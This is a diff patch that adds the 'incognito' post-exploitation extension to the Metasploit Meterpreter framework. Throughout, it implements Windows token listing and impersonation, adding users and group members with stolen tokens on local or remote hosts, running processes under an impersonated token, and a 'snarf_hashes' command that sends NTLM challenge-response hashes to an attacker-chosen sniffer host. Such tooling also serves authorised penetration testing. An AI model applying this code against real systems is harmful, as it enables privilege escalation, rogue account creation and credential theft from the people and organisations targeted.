diff -Nur framework-3.1/lib/rex/post/meterpreter/extensions/incognito/incognito.rb framework-3.0-with-incognito-defcon/lib/rex/post/meterpreter/extensions/incognito/incognito.rb
--- lib/rex/post/meterpreter/extensions/incognito/incognito.rb	1970-01-01 01:00:00.000000000 +0100
+++ lib/rex/post/meterpreter/extensions/incognito/incognito.rb	2007-07-06 22:52:11.000000000 +0100
@@ -0,0 +1,94 @@
+#!/usr/bin/env ruby
+
+require 'rex/post/meterpreter/extensions/incognito/tlv'
+
+module Rex
+module Post
+module Meterpreter
+module Extensions
+module Incognito
+
+###
+#
+# This meterpreter extensions a privilege escalation interface that is capable
+# of doing things like dumping password hashes and performing local
+# exploitation.
+#
+###
+class Incognito < Extension
+
+
+	def initialize(client)
+		super(client, 'incognito')
+
+		client.register_extension_aliases(
+			[
+				{ 
+					'name' => 'incognito',
+					'ext'  => self
+				},
+			])
+	end
+
+
+	def incognito_list_tokens(token_order)
+		request = Packet.create_request('incognito_list_tokens')
+		request.add_tlv(TLV_TYPE_INCOGNITO_LIST_TOKENS_ORDER, token_order)
+
+		response = client.send_request(request)
+		
+		return {
+			'delegation' => response.get_tlv_value(TLV_TYPE_INCOGNITO_LIST_TOKENS_DELEGATION),
+			'impersonation' => response.get_tlv_value(TLV_TYPE_INCOGNITO_LIST_TOKENS_IMPERSONATION) 
+		}
+	end
+
+	def incognito_impersonate_token(username)
+		request = Packet.create_request('incognito_impersonate_token')
+		request.add_tlv(TLV_TYPE_INCOGNITO_IMPERSONATE_TOKEN, username)
+		response = client.send_request(request)
+
+		response.get_tlv_value(TLV_TYPE_INCOGNITO_GENERIC_RESPONSE)
+	end
+
+	def incognito_add_user(host, username, password)
+		request = Packet.create_request('incognito_add_user')
+		request.add_tlv(TLV_TYPE_INCOGNITO_USERNAME, username)
+		request.add_tlv(TLV_TYPE_INCOGNITO_PASSWORD, password)
+		request.add_tlv(TLV_TYPE_INCOGNITO_SERVERNAME, host)
+		response = client.send_request(request)
+
+		response.get_tlv_value(TLV_TYPE_INCOGNITO_GENERIC_RESPONSE)
+	end
+
+	def incognito_add_group_user(host, groupname, username)
+		request = Packet.create_request('incognito_add_group_user')
+		request.add_tlv(TLV_TYPE_INCOGNITO_USERNAME, username)
+		request.add_tlv(TLV_TYPE_INCOGNITO_GROUPNAME, groupname)
+		request.add_tlv(TLV_TYPE_INCOGNITO_SERVERNAME, host)
+		response = client.send_request(request)
+
+		response.get_tlv_value(TLV_TYPE_INCOGNITO_GENERIC_RESPONSE)
+	end
+
+	def incognito_add_localgroup_user(host, groupname, username)
+		request = Packet.create_request('incognito_add_localgroup_user')
+		request.add_tlv(TLV_TYPE_INCOGNITO_USERNAME, username)
+		request.add_tlv(TLV_TYPE_INCOGNITO_GROUPNAME, groupname)
+		request.add_tlv(TLV_TYPE_INCOGNITO_SERVERNAME, host)
+		response = client.send_request(request)
+
+		response.get_tlv_value(TLV_TYPE_INCOGNITO_GENERIC_RESPONSE)
+	end
+
+	def incognito_snarf_hashes(host)
+		request = Packet.create_request('incognito_snarf_hashes')
+		request.add_tlv(TLV_TYPE_INCOGNITO_SERVERNAME, host)
+		response = client.send_request(request)
+
+		return true
+	end
+
+end
+
+end; end; end; end; end
diff -Nur framework-3.1/lib/rex/post/meterpreter/extensions/incognito/tlv.rb framework-3.0-with-incognito-defcon/lib/rex/post/meterpreter/extensions/incognito/tlv.rb
--- lib/rex/post/meterpreter/extensions/incognito/tlv.rb	1970-01-01 01:00:00.000000000 +0100
+++ lib/rex/post/meterpreter/extensions/incognito/tlv.rb	2007-07-06 22:52:11.000000000 +0100
@@ -0,0 +1,21 @@
+module Rex
+module Post
+module Meterpreter
+module Extensions
+module Incognito
+
+TLV_TYPE_INCOGNITO_LIST_TOKENS_DELEGATION        	= TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 2)
+TLV_TYPE_INCOGNITO_LIST_TOKENS_IMPERSONATION        	= TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 3)
+TLV_TYPE_INCOGNITO_LIST_TOKENS_ORDER       	= TLV_META_TYPE_UINT| (TLV_EXTENSIONS + 4)
+TLV_TYPE_INCOGNITO_IMPERSONATE_TOKEN    = TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 5)
+TLV_TYPE_INCOGNITO_GENERIC_RESPONSE    = TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 6)
+TLV_TYPE_INCOGNITO_USERNAME    = TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 7)
+TLV_TYPE_INCOGNITO_PASSWORD    = TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 8)
+TLV_TYPE_INCOGNITO_SERVERNAME    = TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 9)
+TLV_TYPE_INCOGNITO_GROUPNAME    = TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 10)
+
+end
+end
+end
+end
+end
diff -Nur framework-3.1/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb framework-3.0-with-incognito-defcon/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb
--- lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb	2008-01-18 13:03:45.000000000 +0000
+++ lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb	2008-04-09 14:51:52.341638192 +0100
@@ -128,6 +128,9 @@
 			if (opts['Suspended'])
 				flags |= PROCESS_EXECUTE_FLAG_SUSPENDED
 			end
+			if (opts['UseThreadToken'])
+				flags |= PROCESS_EXECUTE_FLAG_USE_THREAD_TOKEN
+			end
 
 			inmem = opts['InMemory']
 			if inmem
diff -Nur framework-3.1/lib/rex/post/meterpreter/extensions/stdapi/tlv.rb framework-3.0-with-incognito-defcon/lib/rex/post/meterpreter/extensions/stdapi/tlv.rb
--- lib/rex/post/meterpreter/extensions/stdapi/tlv.rb	2008-01-18 13:03:45.000000000 +0000
+++ lib/rex/post/meterpreter/extensions/stdapi/tlv.rb	2008-04-09 14:51:52.341638192 +0100
@@ -69,6 +69,7 @@
 PROCESS_EXECUTE_FLAG_HIDDEN      = (1 << 0)
 PROCESS_EXECUTE_FLAG_CHANNELIZED = (1 << 1)
 PROCESS_EXECUTE_FLAG_SUSPENDED   = (1 << 2)
+PROCESS_EXECUTE_FLAG_USE_THREAD_TOKEN = (1 << 3)
 
 # Registry
 TLV_TYPE_HKEY               = TLV_META_TYPE_UINT    | 1000
diff -Nur framework-3.1/lib/rex/post/meterpreter/ui/console/command_dispatcher/incognito.rb framework-3.0-with-incognito-defcon/lib/rex/post/meterpreter/ui/console/command_dispatcher/incognito.rb
--- lib/rex/post/meterpreter/ui/console/command_dispatcher/incognito.rb	1970-01-01 01:00:00.000000000 +0100
+++ lib/rex/post/meterpreter/ui/console/command_dispatcher/incognito.rb	2007-07-06 22:52:11.000000000 +0100
@@ -0,0 +1,241 @@
+require 'rex/post/meterpreter'
+
+module Rex
+module Post
+module Meterpreter
+module Ui
+
+###
+#
+# Privilege escalation extension user interface.
+#
+###
+class Console::CommandDispatcher::Incognito
+
+	Klass = Console::CommandDispatcher::Incognito
+
+	include Console::CommandDispatcher
+
+	#
+	# Initializes an instance of the priv command interaction.
+	#
+	def initialize(shell)
+		super
+	end
+
+	#
+	# List of supported commands.
+	#
+	def commands
+		{
+			"add_user" => "Attempt to add a user with all tokens",
+			"add_localgroup_user" => "Attempt to add a user to a local group with all tokens",
+			"add_group_user" => "Attempt to add a user to a global group with all tokens",
+			"list_tokens" => "List tokens available under current user context",
+			"impersonate_token" => "Impersonate specified token",
+			"snarf_hashes" => "Snarf challenge/response hashes for every token"
+		}
+	end
+
+
+	@@add_user_opts = Rex::Parser::Arguments.new(
+		"-h" => [ true,  "Add user to remote host" ])
+
+	@@add_localgroup_user_opts = Rex::Parser::Arguments.new(
+		"-h" => [ true,  "Add user to local group on remote host" ])
+
+	@@add_group_user_opts = Rex::Parser::Arguments.new(
+		"-h" => [ true,  "Add user to global group on remote host" ])
+
+	@@list_tokens_opts = Rex::Parser::Arguments.new(
+		"-u" => [ false,  "List tokens by unique username" ],
+		"-g" => [ false, "List tokens by unique groupname" ])
+
+	def cmd_list_tokens(*args)
+		token_order = -1
+
+		@@list_tokens_opts.parse(args) { |opt, idx, val|
+			case opt
+				when "-u"
+					token_order = 0
+				when "-g"
+					token_order = 1
+			end
+		}
+
+		if (token_order == -1)
+			print_line("Usage: list_tokens <list_order_option>\n")
+			print_line("Lists all accessible tokens and their privilege level")
+			print_line(@@list_tokens_opts.usage)
+			return
+		end
+
+		system_privilege_check
+
+		tokens = client.incognito.incognito_list_tokens(token_order)
+
+		print_line()
+		print_line("Delegation Tokens Available")
+		print_line("========================================")
+
+		tokens['delegation'].each { |string|
+			print(string)
+                }
+
+		print_line()
+		print_line("Impersonation Tokens Available")
+		print_line("========================================")
+
+		tokens['impersonation'].each { |string|
+			print(string)
+                }
+
+		print_line()
+
+		return true
+	end
+
+	def cmd_impersonate_token(*args)
+		if (args.length < 1)
+			print_line("Usage: impersonate_token <token>\n")
+			print_line("Instructs the meterpreter thread to impersonate the specified token. All other actions will then be made in the context of that token.\n")
+			print_line("Hint: Double backslash DOMAIN\\\\name (meterpreter quirk)")
+			print_line("Hint: Enclose with quotation marks if name contains a space\n")
+			return
+		end
+
+		system_privilege_check
+		username = args[0]
+		client.incognito.incognito_impersonate_token(username).each { |string|
+			print(string)
+		}
+
+		return true
+	end
+
+	def cmd_add_user(*args)
+		# Default to localhost
+		host = "127.0.0.1"
+
+		@@add_user_opts.parse(args) { |opt, idx, val|
+			case opt
+				when "-h"
+					host = val
+			end
+		}
+				
+		if (args.length < 2)
+			print_line("Usage: add_user <username> <password> [options]\n")
+			print_line("Attempts to add a user to a host with all accessible tokens. Terminates when successful, an error that is not access denied occurs (e.g. password does not meet complexity requirements) or when all tokens are exhausted")
+			print_line(@@add_user_opts.usage)
+			return
+		end
+
+		system_privilege_check
+
+		username = args[0]
+		password = args[1]
+
+		client.incognito.incognito_add_user(host, username, password).each { |string|
+			print(string)
+		}
+
+		return true
+	end
+
+	def cmd_add_localgroup_user(*args)
+		# Default to localhost
+		host = "127.0.0.1"
+
+		@@add_localgroup_user_opts.parse(args) { |opt, idx, val|
+			case opt
+				when "-h"
+					host = val
+			end
+		}
+				
+		if (args.length < 2)
+			print_line("Usage: add_localgroup_user <groupname> <username> [options]\n")
+			print_line("Attempts to add a user to a local group on a host with all accessible tokens. Terminates when successful, an error that is not access denied occurs (e.g. user not found) or when all tokens are exhausted")
+			print_line(@@add_localgroup_user_opts.usage)
+			return
+		end
+
+		system_privilege_check
+
+		groupname = args[0]
+		username = args[1]
+
+		client.incognito.incognito_add_localgroup_user(host, groupname, username).each { |string|
+			print(string)
+		}
+
+		return true
+	end
+
+	def cmd_add_group_user(*args)
+		# Default to localhost
+		host = "127.0.0.1"
+
+		@@add_group_user_opts.parse(args) { |opt, idx, val|
+			case opt
+				when "-h"
+					host = val
+			end
+		}
+				
+		if (args.length < 2)
+			print_line("Usage: add_group_user <groupname> <username> [options]\n")
+			print_line("Attempts to add a user to a global group on a host with all accessible tokens. Terminates when successful, an error that is not access denied occurs (e.g. user not found) or when all tokens are exhausted")
+			print_line(@@add_group_user_opts.usage)
+			return
+		end
+
+		system_privilege_check
+
+		groupname = args[0]
+		username = args[1]
+
+		client.incognito.incognito_add_group_user(host, groupname, username).each { |string|
+			print(string)
+		}
+
+		return true
+	end
+
+	def cmd_snarf_hashes(*args)
+		if (args.length < 1)
+			print_line("Usage: snarf_hashes <sniffer_host>\n")
+			print_line("Captures LANMAN/NTLM challenge response hashes by making SMB requests to the supplied sniffing host with every accessible token.\n")
+			return
+		end
+
+		system_privilege_check
+
+		print_line("[*] Snarfing token hashes...")
+		client.incognito.incognito_snarf_hashes(args[0])
+		print_line("[*] Done. Check sniffer logs")
+		
+		return true
+	end
+
+	def system_privilege_check
+		if (client.sys.config.getuid != "NT AUTHORITY\\SYSTEM")
+			print_line("[-] Warning: Not currently running as SYSTEM, not all tokens will be available")
+			print_line("             Call rev2self if primary process token is SYSTEM")
+		end
+	end
+
+	#
+	# Name for this dispatcher
+	#
+	def name
+		"Incognito"
+	end
+
+end
+
+end
+end
+end
+end
diff -Nur framework-3.1/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/sys.rb framework-3.0-with-incognito-defcon/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/sys.rb
--- lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/sys.rb	2008-01-18 13:03:46.000000000 +0000
+++ lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/sys.rb	2008-04-09 14:51:52.344637736 +0100
@@ -27,7 +27,8 @@
 		"-H" => [ false, "Create the process hidden from view."                    ],
 		"-i" => [ false, "Interact with the process after creating it."            ],
 		"-m" => [ false, "Execute from memory."                                    ],
-		"-d" => [ true,  "The 'dummy' executable to launch when using -m."         ])
+		"-d" => [ true,  "The 'dummy' executable to launch when using -m."         ],
+		"-t" => [ false, "Execute process with currently impersonated thread token"])
 
 	#
 	# Options used by the 'reg' command.
@@ -79,6 +80,7 @@
 		dummy_exec  = "cmd"
 		cmd_args    = nil
 		cmd_exec    = nil
+		use_thread_token = false
 
 		@@execute_opts.parse(args) { |opt, idx, val|
 			case opt
@@ -103,6 +105,8 @@
 				when "-i"
 					channelized = true
 					interact = true
+				when "-t"
+					use_thread_token = true
 			end
 		}
 
@@ -116,7 +120,8 @@
 		p = client.sys.process.execute(cmd_exec, cmd_args, 
 			'Channelized' => channelized,
 			'Hidden'      => hidden,
-			'InMemory'    => (from_mem) ? dummy_exec : nil)
+			'InMemory'    => (from_mem) ? dummy_exec : nil,
+			'UseThreadToken' => use_thread_token)
 
 		print_line("Process #{p.pid} created.")
 		print_line("Channel #{p.channel.cid} created.") if (p.channel)
